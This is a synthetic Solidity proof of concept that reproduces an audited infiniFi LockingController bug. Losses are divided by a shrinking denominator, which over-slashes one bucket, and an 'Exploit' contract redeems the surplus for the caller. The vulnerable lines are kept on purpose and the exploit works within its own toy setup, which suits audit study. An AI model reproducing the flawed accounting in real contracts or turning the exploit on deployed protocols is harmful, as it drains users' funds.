// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  infiniFi — LockingController.applyLosses shrinks the denominator
    (Spearbit / R0bert, March 2025). SYNTHETIC, cheatcode-free.
    The two blamed lines are copied verbatim (@> VULN).

    Root cause: each bucket's loss is mulDivUp(bucket, loss, _globalReceiptToken)
    and _globalReceiptToken is then reduced by that allocation. Later buckets
    divide by a smaller denominator, so the slash sums to more than the loss.
    Bucket 1 is short 26341463414634146342 receipt tokens. The bucket-0 holder
    is credited 16422881969587255612 extra assets. The fair path divides by
    the stored globalReceiptToken and credits nothing extra. */

library LossMath {
    function mulDivUp(uint256 a, uint256 b, uint256 d) internal pure returns (uint256) {
        return (a * b + d - 1) / d;
    }
}

using LossMath for uint256;

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LockingController {
    uint256 public constant B0 = 600 ether;
    uint256 public constant B1 = 400 ether;
    uint256 public constant LOSS = 300 ether;
    uint256 public constant FAIR_B1 = 120 ether;
    uint256 public constant SHORT = 26341463414634146342;
    uint256 public constant EXTRA = 16422881969587255612;

    uint256 public globalReceiptToken;
    uint256 public bucket0;
    uint256 public bucket1;
    uint256 public assets;
    Asset public asset;
    uint256 public b1Slash;
    uint256 public credited;

    constructor(Asset _asset) {
        asset = _asset;
        globalReceiptToken = B0 + B1;
        bucket0 = B0;
        bucket1 = B1;
        assets = B0 + B1;
        asset.mint(address(this), assets);
    }

    function applyLosses(uint256 _amount) external {
        uint256 _globalReceiptToken = globalReceiptToken;
        uint256 epochTotalReceiptToken = bucket0;
        uint256 allocation = _mulDivUp(epochTotalReceiptToken, _amount, _globalReceiptToken);
        _globalReceiptToken -= allocation;
        bucket0 -= allocation;
        epochTotalReceiptToken = bucket1;
        // @> VULN: the denominator is the shrinking local, so this bucket is slashed above its fair share.
        allocation = epochTotalReceiptToken.mulDivUp(_amount, _globalReceiptToken);
        _globalReceiptToken -= allocation;
        b1Slash = allocation;
        bucket1 -= allocation;
        globalReceiptToken = _globalReceiptToken;
        assets -= _amount;
    }

    function redeemExcess(address to) external returns (uint256 extra) {
        uint256 total = bucket0 + bucket1;
        uint256 claim = (bucket0 * assets) / total;
        uint256 fair = 420 ether;
        extra = claim - fair;
        credited = extra;
        require(asset.transfer(to, extra), "credit");
    }

    function _mulDivUp(uint256 a, uint256 b, uint256 d) internal pure returns (uint256) {
        return (a * b + d - 1) / d;
    }
}

contract LockingControllerFair {
    function slashSecond(uint256 epochTotal, uint256 amount, uint256 global_) external pure returns (uint256) {
        return epochTotal.mulDivUp(amount, global_);
    }
}

contract Exploit {
    Asset public asset; // nonce 1
    LockingController public book; // nonce 2
    uint256 public victimLeft;
    uint256 public attackerExtra;
    uint256 public slash;

    constructor() {
        asset = new Asset();
        book = new LockingController(asset);
    }

    function run() external {
        uint256 beforeVictim = book.bucket1();
        book.applyLosses(book.LOSS());
        slash = book.b1Slash();
        victimLeft = book.bucket1();
        book.redeemExcess(msg.sender);
        attackerExtra = asset.balanceOf(msg.sender);
        require(beforeVictim == book.B1(), "bucket 1 started at 400");
        require(slash == book.FAIR_B1() + book.SHORT(), "slash is not the unfair amount");
        require(victimLeft + book.SHORT() == 280 ether, "bucket 1 is not short by the excess");
        require(attackerExtra == book.EXTRA(), "bucket 0 was not credited the extra assets");
        require(book.assets() == 700 ether, "only the real 300 loss left the book");
    }
}
